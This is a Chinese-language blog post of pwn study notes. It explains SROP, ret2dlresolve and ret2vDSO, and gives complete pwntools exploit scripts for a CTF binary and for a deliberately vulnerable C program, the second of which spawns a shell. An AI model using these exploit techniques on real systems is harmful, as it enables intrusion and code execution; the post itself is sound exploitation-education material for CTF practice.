---
title: "Special Topic: Tricky tricks summary for Pwn"
published: 2025-02-01
updated: 2025-02-04
description: "This special topic is about some tricky tricks i've learned so far in Pwn field. Keep updating as the mood strikes."
image: "https://fastly.jsdelivr.net/gh/CuB3y0nd/picx-images-hosting@master/.5trbo219x2.avif"
tags: ["Pwn", "Tricks", "Notes"]
category: "Notes"
draft: false
---

# 前言

> 写这篇博客的起因应该是为了一个即将到来的比赛，而我还有好多 high level tricks 没学过，万一在比赛上碰到了再临场学肯定是很浪费时间的，而且为不同 tricks 都单独写一篇博客显然不是很好，我一般喜欢围绕一个大的系列来写博客，~_这样才能显得不那么水，是吧？_~
>
> 好吧，上面说的只是一个最次要的原因罢了。这就不得不提到我 23 年刚推开 Pwn 之门的一条缝后的一个小梦想了……众所不周知 Pwn 方面优秀的系统教程应该可以说是少得可怜，相当于没有。所以我当时的这个小梦想就是写一份有关 Pwn 的详细教程，让有志之士从入门到入坟，少走弯路，不那么痛苦。~_伟大吗？_~
>
> 唉，你还能在[我的原博客](https://tailwind-nextjs-starter-blog-ruby.vercel.app/)看到我以前写的系列文章。现在看看写的什么 trash，叫人从哪开始看都不知道，而且当时只是边学边翻译了 [ir0nstone 的笔记](https://ir0nstone.gitbook.io/)，说白了就是搬运，没多少自己的成分在里面……所以这第二次做同样的事嘛，我一定会比第一次做的好 $\infty$ 倍。~_有关这方面，我的字典里面没有，也不允许出现「不行」这个词。_~
>
> 其实我本来想用 GitBook 或者建一个类似 wiki 的平台来写这个的，不过最终还是决定放在这里，为啥？我不道啊……
>
> 正如我在 Description 中写的：_Keep updating as the mood strikes._ 不论你现在看到的这篇文章有多简陋……给我点时间，未来它一定会成为一本不错的手册！
>
> 莫欺少年穷，咱顶峰相见。
>
> <p style="text-align: right;">——以上，书于 02/01/2025</p>

# ROP 那些事

## ret2csu

我在 [ROP Emporium - Challenge 8](/posts/rop-emporium-series/#challenge-8) 写的已经很详细了，最近比赛赶时间，等我打完之后再来慢慢完善吧，只能暂且劳请各位老爷们先凑合着看了<s>_（如果有人看的话。/真叫人伤心）_</s>。

## SROP

### Principle

Okay, the first thing, what is `SROP`?

`SROP (Signal Return Oriented Programming)`，思想是利用操作系统信号处理机制的漏洞来实现对程序控制流的劫持。

首先得知道，信号是操作系统发送给程序的中断信息，通常用于指示发生了一些必须立即处理的异常情况。

而 `sigreturn` 则是一个特殊的 `syscall`，负责在信号处理函数执行完后根据栈上保存的 `sigcontext` 的内容进行清理工作（还原到程序在进行信号处理之前的运行状态，就好像什么都没有发生一样，以便于接着运行因中断而暂停的程序）。它帮助程序**从 Signal Handler（泛指信号处理函数）中返回**，并通过清理信号处理函数使用的栈帧来恢复程序的运行状态。

我们知道，在传统的 ROP 中，攻击者可以利用程序中已存在的 gadgets 构造一个指令序列来执行恶意代码。SROP 则在此基础上利用了信号处理机制的漏洞，在信号处理函数的上下文切换中执行攻击，实现一次控制所有寄存器的效果。

攻击步骤大致如下：

- 攻击者通过在栈上伪造 `sigcontext` 结构来为控制寄存器的值做准备。一般会在这一步设置好后续 ROP Chain 中恶意代码要用到的参数，需要注意的是没有设置的寄存器在执行 `sigreturn` 后会被 zero out.
- 想办法令目标程序执行 `sigreturn`，进行信号处理。
- 调用 `sigreturn` 后，系统会暂停当前程序的执行，通过 Signal Handler 处理信号，处理完后根据 `sigcontext` 的内容恢复运行环境。
- 这时候我们已经达成了设置参数的目的，可以选择返回到 ROP Chain 继续执行恶意代码。

正常情况下当遇到需要处理信号的时候，`kernel` 会在栈上创建一个新的栈帧，并生成一个 `sigcontext` 结构保存在新的栈帧中，`sigcontext` 本质上就是一个对执行信号处理函数前的运行环境的快照，以便之后恢复到执行信号处理函数之前的环境接着运行；接着切换上下文到 Signal Handler 中进行信号处理工作；当信号不再被阻塞时，`sigreturn` 会根据栈中保存的 `sigcontext` 弹出所有寄存器的值，有效地将寄存器还原为执行信号处理之前的状态。

那对于我们主动诱导程序去执行 `sigreturn` 的这种非正常情况，栈上肯定是不会有 `kernel` 生成的 `sigcontext` 结构的，我就问你你能不能在栈上伪造一个 `sigcontext` 出来？嘿嘿。

敏锐的你现在是不是想跳起来惊呼，这是不是好比核武器？没错，通过伪造 `sigcontext` 你可以一次控制所有寄存器的值，SO FUCKING POWERFUL!

不幸的是这也是它的缺点所在……如果你不能泄漏栈值，就无法为 RSP 等寄存器设置一个有效的值，这或许是个棘手的问题。但无论如何，这都是一个强大的 trick, 尤其是在可用的 gadgets 有限的情况下。

用于恢复状态的 `sigcontext` 的结构如下 (基于 `x86_64`)：

```plaintext wrap=false showLineNumbers=false
+--------------------+--------------------+
| rt_sigeturn()      | uc_flags           |
+--------------------+--------------------+
| &uc                | uc_stack.ss_sp     |
+--------------------+--------------------+
| uc_stack.ss_flags  | uc.stack.ss_size   |
+--------------------+--------------------+
| r8                 | r9                 |
+--------------------+--------------------+
| r10                | r11                |
+--------------------+--------------------+
| r12                | r13                |
+--------------------+--------------------+
| r14                | r15                |
+--------------------+--------------------+
| rdi                | rsi                |
+--------------------+--------------------+
| rbp                | rbx                |
+--------------------+--------------------+
| rdx                | rax                |
+--------------------+--------------------+
| rcx                | rsp                |
+--------------------+--------------------+
| rip                | eflags             |
+--------------------+--------------------+
| cs / gs / fs       | err                |
+--------------------+--------------------+
| trapno             | oldmask (unused)   |
+--------------------+--------------------+
| cr2 (segfault addr)| &fpstate           |
+--------------------+--------------------+
| __reserved         | sigmask            |
+--------------------+--------------------+
```

有关 SROP 的演示，这里还有一个视频讲的也很好，强推给你！

<iframe
  width="100%"
  height="468"
  src="https://www.youtube.com/embed/ADULSwnQs-s?si=j1WVxYk2FPR21uZQ"
  title="YouTube video player"
  frameborder="0"
  allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
  allowfullscreen>
</iframe>

### Example

好了，知道了这些基础概念后，下面就通过 Backdoor CTF 2017 的 [Fun Signals](https://github.com/guyinatuxedo/nightmare/blob/master/modules/16-srop/backdoor_funsignals/funsignals_player_bin) 这道题来实战一下吧～

```asm wrap=false showLineNumbers=false ins={35}
.shellcode:0000000010000000                     .686p
.shellcode:0000000010000000                     .mmx
.shellcode:0000000010000000                     .model flat
.shellcode:0000000010000000     .intel_syntax noprefix
.shellcode:0000000010000000
.shellcode:0000000010000000     ; ===========================================================================
.shellcode:0000000010000000
.shellcode:0000000010000000     ; Segment type: Pure code
.shellcode:0000000010000000     ; Segment permissions: Read/Write/Execute
.shellcode:0000000010000000     _shellcode      segment byte public 'CODE' use64
.shellcode:0000000010000000                     assume cs:_shellcode
.shellcode:0000000010000000                     ;org 10000000h
.shellcode:0000000010000000                     assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
.shellcode:0000000010000000
.shellcode:0000000010000000                     public _start
.shellcode:0000000010000000     _start:                                 ; Alternative name is '_start'
.shellcode:0000000010000000                     xor     eax, eax        ; __start
.shellcode:0000000010000002                     xor     edi, edi        ; Logical Exclusive OR
.shellcode:0000000010000004                     xor     edx, edx        ; Logical Exclusive OR
.shellcode:0000000010000006                     mov     dh, 4
.shellcode:0000000010000008                     mov     rsi, rsp
.shellcode:000000001000000B                     syscall                 ; LINUX - sys_read
.shellcode:000000001000000D                     xor     edi, edi        ; Logical Exclusive OR
.shellcode:000000001000000F                     push    0Fh
.shellcode:0000000010000011                     pop     rax
.shellcode:0000000010000012                     syscall                 ; LINUX - sys_rt_sigreturn
.shellcode:0000000010000014                     int     3               ; Trap to Debugger
.shellcode:0000000010000015
.shellcode:0000000010000015     syscall:                                ; LINUX - sys_rt_sigreturn
.shellcode:0000000010000015                     syscall
.shellcode:0000000010000017                     xor     rdi, rdi        ; Logical Exclusive OR
.shellcode:000000001000001A                     mov     rax, 3Ch ; '<'
.shellcode:0000000010000021                     syscall                 ; LINUX - sys_exit
.shellcode:0000000010000021     ; ---------------------------------------------------------------------------
.shellcode:0000000010000023     flag            db 'fake_flag_here_as_original_is_at_server',0
.shellcode:0000000010000023     _shellcode      ends
.shellcode:0000000010000023
```

可以看到这是一个非常简单的程序，单纯的就是为了考 SROP，以至于出题人都直接手撸汇编了。

注意到 flag 被硬编码在 `0x10000023` 这个位置了，所以我们的目标就是输出这个地址处的内容。由于这个程序没开 ASLR 什么的保护，拿下它还是非常轻松的。

简单分析一下这个程序，我们知道它在第一个 `syscall` 处调用了 `read`，从 `stdin` 读取了 `0x400` bytes 到栈上。紧接着第二个 `syscall` 直接帮我们调用了 `rt_sigreturn`，那就不用我们自己动手了，我们只要伪造并发送 `sigcontext` 栈帧即可。思路是伪造一个 `SYS_write` 的调用，将 flag 输出到 `stdout`。

### Exploit

```python
#!/usr/bin/python3

from contextlib import contextmanager

from pwn import (
    ELF,
    ROP,
    SigreturnFrame,
    constants,
    context,
    gdb,
    log,
    process,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./funsignals_player_bin"
HOST, PORT = "localhost", 1337

gdbscript = """
b *_start+11
c
"""


@contextmanager
def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    target = None

    try:
        if local:
            global elf

            elf = ELF(FILE)
            context.binary = elf

            target = (
                gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
                if debug
                else process([elf.path] + (argv or []), env=envp)
            )
        else:
            target = remote(HOST, PORT)
        yield target
    finally:
        if target:
            target.close()


def construct_payload():
    flag_address = 0x10000023

    rop = ROP(elf)

    syscall = rop.syscall.address

    frame = SigreturnFrame()

    frame.rdi = 0x1
    frame.rsi = flag_address
    frame.rdx = 0x1337
    frame.rax = constants.SYS_write
    frame.rip = syscall

    return bytes(frame)


def attack(target):
    try:
        payload = construct_payload()

        target.send(payload)

        response = target.recvall(timeout=3)

        if b"flag" in response:
            log.success(response[:0x27].decode("ascii"))

            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        with launch(debug=False) as target:
            if attack(target):
                log.success("Attack completed successfully.")
            else:
                log.failure("Attack did not yield a flag.")
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

### Summary

总结：有的时候你的 ROP Chain 可能会缺少一些必要的 gadgets，导致无法设定某些后续攻击代码需要用到的参数，这时候就可以考虑使用 SROP 来控制寄存器。当然，使用 SROP 也是有条件的，比如你起码得有 `syscall` 这个 gadget，并且能控制 `rax` 的值为 `sigreturn` 的系统调用号。

> [!TIP]
> 要知道 `rax` 是一个特殊的寄存器，通常用于保存函数的返回值。所以当我说控制 `rax` 的值时，你不一定非得通过某些 gadgets 来实现这一点，有时候程序本身就可以为你设置好它，比如 `read` 函数会返回读到的字节数。

### References

- [Boosting your ROP skills with SROP and ret2dlresolve - Giulia Martino - HackTricks Track 2023](https://youtu.be/ADULSwnQs-s?si=TC5OyUwFHDFEHRO3)
- [sigreturn(2) — Linux manual page](https://man7.org/linux/man-pages/man2/sigreturn.2.html)
- [Playing with signals: an overview on Sigreturn Oriented Programming](https://www.stormshield.com/news/playing-with-signals-an-overview-on-sigreturn-oriented-programming/)

## ret2dlresolve

### Principle

对于 `dynamically linked` 的程序，当它第一次调用共享库中的函数时，动态链接器（如 `ld-linux-x86-64.so.2`）会通过 `_dl_runtime_resolve` 函数动态解析共享库中符号的地址，并将解析出来的实际地址保存到 `GOT (Global Offset Table)` 中，这样下次调用这个函数就不需要再次解析，可以直接通过全局偏移表进行跳转。

以上流程我们称之为重定位 (Relocation)。

> 具体重定位流程以及为什么需要重定位，不同 `RELRO` 保护级别之间的区别之类的，我之后再单独开一个小标题来写，这里先占个坑。

`_dl_runtime_resolve` 函数从栈中获取对一些它需要的结构的引用，以便解析指定的符号。因此攻击者通过伪造这个结构就可以劫持 `_dl_runtime_resolve` 让它去解析任意符号地址。

### Example

我们就以 `pwntools` 官方文档里面提供的示例程序来学习 how to ret2dlresolve. 其实就是学一下如何使用它提供的自动化工具……有关如何手动伪造 `_dl_runtime_resolve` 所需的结构体，以及一些更深入的话题，我之后应该还会回来填这个坑，先立 flag 了哈哈哈。

示例程序来源于 [pwnlib.rop.ret2dlresolve — Return to dl_resolve](https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html)，通过下面这条指令来编译：

```bash wrap=false showLineNumbers=false
gcc ret2dlresolve.c -o ret2dlresolve \
    -fno-stack-protector \
    -no-pie
```

`pwntools` 官方文档里给我们的程序源码是这样的：

```c
#include <unistd.h>

void vuln(void) {
  char buf[64];

  read(STDIN_FILENO, buf, 200);
}

int main(int argc, char **argv) { vuln(); }
```

但是编译出来后发现真 TM 坑，没有控制前三个参数的 gadgets，导致我们不能写入伪造的结构体……所以为了实验的顺利进行，我只得手动插入几个 gadgets 了：

```c
#include <unistd.h>

void free_gadgets() {
  __asm__("pop %rdi; ret");
  __asm__("pop %rsi; ret");
  __asm__("pop %rdx; ret");
}

void vuln(void) {
  char buf[64];

  read(STDIN_FILENO, buf, 200);
}

int main(int argc, char **argv) { vuln(); }
```

程序很简单，从 `stdin` 读取了 200 字节数据到 `buf`，由于 `buf` 只有可怜的 64 字节空间，故存在 136 字节溢出空间。空间如此之充裕，让我们有足够的余地来编排一曲邪恶的代码交响乐，演绎攻击者的狂想曲。

我们的目标是通过 `ret2dlresolve` 技术来 getshell. 思路大致应该是：将伪造的用于解析 `system` 符号的结构体放到一个 `rw` 空间，并提前设置好 `system` 函数要用到的参数，也就是将 `rdi` 设为 `/bin/sh` 字符串的地址。接着在栈上布置我们伪造的结构的地址，以便 `_dl_runtime_resolve` 引用我们伪造的这个结构体来解析符号。现在我们调用 `_dl_runtime_resolve` 就会解析出 `system` 的地址，根据我们先前设置好的参数，程序会乖乖的 spawn a shell.

### Exploit

```python
#!/usr/bin/python3

from contextlib import contextmanager

from pwn import (
    ELF,
    ROP,
    Ret2dlresolvePayload,
    context,
    flat,
    gdb,
    log,
    process,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./ret2dlresolve"
HOST, PORT = "localhost", 1337

gdbscript = """
b *vuln+25
c
"""


@contextmanager
def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    target = None

    try:
        if local:
            global elf

            elf = ELF(FILE)
            context.binary = elf

            target = (
                gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
                if debug
                else process([elf.path] + (argv or []), env=envp)
            )
        else:
            target = remote(HOST, PORT)
        yield target
    finally:
        if target:
            target.close()


def construct_payload(padding_to_ret, first_read_size):
    dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
    fake_structure = dlresolve.payload

    rop = ROP(elf)

    rop.read(0, dlresolve.data_addr, len(fake_structure))
    rop.raw(rop.ret.address)
    rop.ret2dlresolve(dlresolve)

    log.success(rop.dump())

    raw_rop = rop.chain()

    return flat({padding_to_ret: raw_rop, first_read_size: fake_structure})


def attack(target):
    try:
        payload = construct_payload(0x48, 0xC8)

        target.sendline(payload)
        target.interactive()
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        with launch(debug=False) as target:
            attack(target)
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

### Summary

当没有可用的 `syscall` gadgets 来实现 `ret2syscall` 或 `SROP`，并且没有办法泄漏 `libc` 地址时，可以考虑 `ret2dlresolve`。

### References

- [Boosting your ROP skills with SROP and ret2dlresolve - Giulia Martino - HackTricks Track 2023](https://youtu.be/ADULSwnQs-s?si=TC5OyUwFHDFEHRO3)
- [ret2dl_resolve x64: Exploiting Dynamic Linking Procedure In x64 ELF Binaries](https://syst3mfailure.io/ret2dl_resolve/)
- [Finding link_map and \_dl_runtime_resolve() under full RELRO](https://ypl.coffee/dl-resolve-full-relro/)

## ret2vDSO

### Principle

`vDSO (Virtual Dynamic Shared Object)` 是 Linux 内核为用户态程序提供的一个特殊共享库，注意它是虚拟的，本身并不存在，它做的只是将一些常用的内核态调用映射到用户地址空间。这么做的目的是为了加速系统调用，避免频繁地从用户态切换到内核态，有效的减少了切换带来的巨大开销。

在 vDSO 区域 可能存在一些 gadgets，用于从用户态切换到内核态。我们关注的就是这块区域里有没有什么可供我们利用的 gadgets，通常需要手动把 vDSO dump 出来分析。

### Example

崩溃了兄弟，我自己出了一道题然后折腾了两天做不出来……我好菜啊……受到致命心理打击。例题等我缓过来再说吧，估计一年都不想碰这个了……反正只要知道 vDSO 区域里面存在一些可用的 gadgets 就好了，剩下的和普通 ROP 没啥区别。

示范一下怎么通过 gdb dump 出 vDSO：

```asm wrap=false showLineNumbers=false
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x555555554000     0x555555555000 r--p     1000      0 /home/cub3y0nd/Projects/ret2vDSO/ret2vDSO
    0x555555555000     0x555555556000 r-xp     1000   1000 /home/cub3y0nd/Projects/ret2vDSO/ret2vDSO
    0x555555556000     0x555555557000 r--p     1000   2000 /home/cub3y0nd/Projects/ret2vDSO/ret2vDSO
    0x7ffff7fbf000     0x7ffff7fc1000 rw-p     2000      0 [anon_7ffff7fbf]
    0x7ffff7fc1000     0x7ffff7fc5000 r--p     4000      0 [vvar]
    0x7ffff7fc5000     0x7ffff7fc7000 r-xp     2000      0 [vdso]
    0x7ffff7fc7000     0x7ffff7fc8000 r--p     1000      0 /usr/lib/ld-linux-x86-64.so.2
    0x7ffff7fc8000     0x7ffff7ff1000 r-xp    29000   1000 /usr/lib/ld-linux-x86-64.so.2
    0x7ffff7ff1000     0x7ffff7ffb000 r--p     a000  2a000 /usr/lib/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7fff000 rw-p     4000  34000 /usr/lib/ld-linux-x86-64.so.2
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
pwndbg> dump memory vdso.so 0x7ffff7fc5000 0x7ffff7fc7000
```

用 `ROPgadget` 分析 dump 出来的文件，大概那么一看有将近 500 个 gadgets，不过好像并不是很实用呢？感觉用这个 trick 性价比不高，不过也是一个值得尝试的方法。

嗯……再来介绍个好东西，叫 `ELF Auxiliary Vectors (AUXV)`，ELF 辅助向量。它是内核在加载 ELF 可执行文件时传递给用户态程序的一组键值对。包含了与程序运行环境相关的底层信息，例如系统调用接口位置、内存布局、硬件能力等。

当一个程序被加载时，Linux 内核将参数数量 (argc)、参数 (argv)、环境变量 (envp) 以及 AUXV 结构传递给程序的入口函数。程序可以通过系统提供的 `getauxval` 访问这些辅助向量，以获取系统信息。

看看当前最新的 `v6.14-rc1` 内核中有关它的定义（旧版本中有关它的定义在 `elf.h` 中）：

```c
/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */
#ifndef _UAPI_LINUX_AUXVEC_H
#define _UAPI_LINUX_AUXVEC_H

#include <asm/auxvec.h>

/* Symbolic values for the entries in the auxiliary table
   put on the initial stack */
#define AT_NULL   0 /* end of vector */
#define AT_IGNORE 1 /* entry should be ignored */
#define AT_EXECFD 2 /* file descriptor of program */
#define AT_PHDR   3 /* program headers for program */
#define AT_PHENT  4 /* size of program header entry */
#define AT_PHNUM  5 /* number of program headers */
#define AT_PAGESZ 6 /* system page size */
#define AT_BASE   7 /* base address of interpreter */
#define AT_FLAGS  8 /* flags */
#define AT_ENTRY  9 /* entry point of program */
#define AT_NOTELF 10 /* program is not ELF */
#define AT_UID    11 /* real uid */
#define AT_EUID   12 /* effective uid */
#define AT_GID    13 /* real gid */
#define AT_EGID   14 /* effective gid */
#define AT_PLATFORM 15  /* string identifying CPU for optimizations */
#define AT_HWCAP  16    /* arch dependent hints at CPU capabilities */
#define AT_CLKTCK 17 /* frequency at which times() increments */
/* AT_* values 18 through 22 are reserved */
#define AT_SECURE 23   /* secure mode boolean */
#define AT_BASE_PLATFORM 24 /* string identifying real platform, may
     * differ from AT_PLATFORM. */
#define AT_RANDOM 25 /* address of 16 random bytes */
#define AT_HWCAP2 26 /* extension of AT_HWCAP */
#define AT_RSEQ_FEATURE_SIZE 27 /* rseq supported feature size */
#define AT_RSEQ_ALIGN  28 /* rseq allocation alignment */
#define AT_HWCAP3 29 /* extension of AT_HWCAP */
#define AT_HWCAP4 30 /* extension of AT_HWCAP */

#define AT_EXECFN  31 /* filename of program */

#ifndef AT_MINSIGSTKSZ
#define AT_MINSIGSTKSZ 51 /* minimal stack size for signal delivery */
#endif

#endif /* _UAPI_LINUX_AUXVEC_H */
```

对于特定的架构可能还有一些特别的宏定义：

```c
/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */
#ifndef _ASM_X86_AUXVEC_H
#define _ASM_X86_AUXVEC_H
/*
 * Architecture-neutral AT_ values in 0-17, leave some room
 * for more of them, start the x86-specific ones at 32.
 */
#ifdef __i386__
#define AT_SYSINFO 32
#endif
#define AT_SYSINFO_EHDR 33

/* entries in ARCH_DLINFO: */
#if defined(CONFIG_IA32_EMULATION) || !defined(CONFIG_X86_64)
# define AT_VECTOR_SIZE_ARCH 3
#else /* else it's non-compat x86-64 */
# define AT_VECTOR_SIZE_ARCH 2
#endif

#endif /* _ASM_X86_AUXVEC_H */
```

以上所有内容的参考链接我都放在末尾的 References 了，感兴趣的自行查阅。

我们可以通过指定 `LD_SHOW_AUXV=1` 来查看程序的 AUXV 信息：

```bash wrap=false showLineNumbers=false
λ ~/ LD_SHOW_AUXV=1 w
AT_SYSINFO_EHDR:      0x7f92c06b9000
AT_MINSIGSTKSZ:       1776
AT_HWCAP:             178bfbff
AT_PAGESZ:            4096
AT_CLKTCK:            100
AT_PHDR:              0x626d19090040
AT_PHENT:             56
AT_PHNUM:             13
AT_BASE:              0x7f92c06bb000
AT_FLAGS:             0x0
AT_ENTRY:             0x626d19092940
AT_UID:               1000
AT_EUID:              1000
AT_GID:               1000
AT_EGID:              1000
AT_SECURE:            0
AT_RANDOM:            0x7ffca3edf4e9
AT_HWCAP2:            0x2
AT_EXECFN:            /usr/bin/w
AT_PLATFORM:          x86_64
AT_RSEQ_FEATURE_SIZE: 28
AT_RSEQ_ALIGN:        32
 14:19:59 up  3:54,  1 user,  load average: 0.52, 0.57, 0.59
USER     TTY       LOGIN@   IDLE   JCPU   PCPU  WHAT
cub3y0nd tty1      10:26    3:53m  6:43    ?    xinit /home/cub3y0nd/.xinitrc -- /etc/X11/xinit/xs
```

注意到这个变量是以 `LD_` 开头的，说明动态链接器会负责解析这个变量，因此，如果程序是静态链接的，那使用这个变量将不会得到任何输出。

但是得不到输出不代表它没有，用 `pwndbg` 的 `i auxv` 或 `auxv` 也可以查看程序的 AUXV 信息（或者你手动 telescope stack）：

```asm wrap=false showLineNumbers=false
pwndbg> i auxv
33   AT_SYSINFO_EHDR      System-supplied DSO's ELF header 0x7ffff7ffd000
51   AT_MINSIGSTKSZ       Minimum stack size for signal delivery 0x6f0
16   AT_HWCAP             Machine-dependent CPU capability hints 0x178bfbff
6    AT_PAGESZ            System page size               4096
17   AT_CLKTCK            Frequency of times()           100
3    AT_PHDR              Program headers for program    0x400040
4    AT_PHENT             Size of program header entry   56
5    AT_PHNUM             Number of program headers      6
7    AT_BASE              Base address of interpreter    0x0
8    AT_FLAGS             Flags                          0x0
9    AT_ENTRY             Entry point of program         0x40101d
11   AT_UID               Real user ID                   1000
12   AT_EUID              Effective user ID              1000
13   AT_GID               Real group ID                  1000
14   AT_EGID              Effective group ID             1000
23   AT_SECURE            Boolean, was exec setuid-like? 0
25   AT_RANDOM            Address of 16 random bytes     0x7fffffffe789
26   AT_HWCAP2            Extension of AT_HWCAP          0x2
31   AT_EXECFN            File name of executable        0x7fffffffefce "/home/cub3y0nd/Projects/ret2vDSO/ret2vDSO"
15   AT_PLATFORM          String identifying platform    0x7fffffffe799 "x86_64"
27   AT_RSEQ_FEATURE_SIZE rseq supported feature size    28
28   AT_RSEQ_ALIGN        rseq allocation alignment      32
0    AT_NULL              End of vector                  0x0
```

这之中我们最关心的应该是 `AT_SYSINFO_EHDR`，它与 `vDSO` 的起始地址相同。因此，只要能把它泄漏出来，我们就可以掌握 vDSO 的 gadgets 了。

其中 `AT_RANDOM` 好像也是一个很实用的东西，等我有空了再好好研究研究这些，话说这是我立的第几个 flag 了……

一般程序的返回地址之后紧接着的就是 `argc`，然后是 `argv`，再之后就是 `envp`，最后还有一堆信息，它们就是 `AUXV` 了，这些都在栈上保存，自己研究去吧，我心好累……

### Summary

反正我感觉这是一个性价比不怎么高的 trick，不过要是实在没办法搞到可用的 gadgets 的话还是可以考虑一下的。

### References

- [vDSO](https://en.wikipedia.org/wiki/VDSO)
- [getauxval(3) — Linux manual page](https://man7.org/linux/man-pages/man3/getauxval.3.html)
- [kernel/git/torvalds/linux.git - path: root/include/uapi/linux/auxvec.h](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/uapi/linux/auxvec.h?h=v6.14-rc1)
- [kernel/git/torvalds/linux.git - path: root/arch/x86/include/uapi/asm/auxvec.h](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/x86/include/uapi/asm/auxvec.h?h=v6.14-rc1)
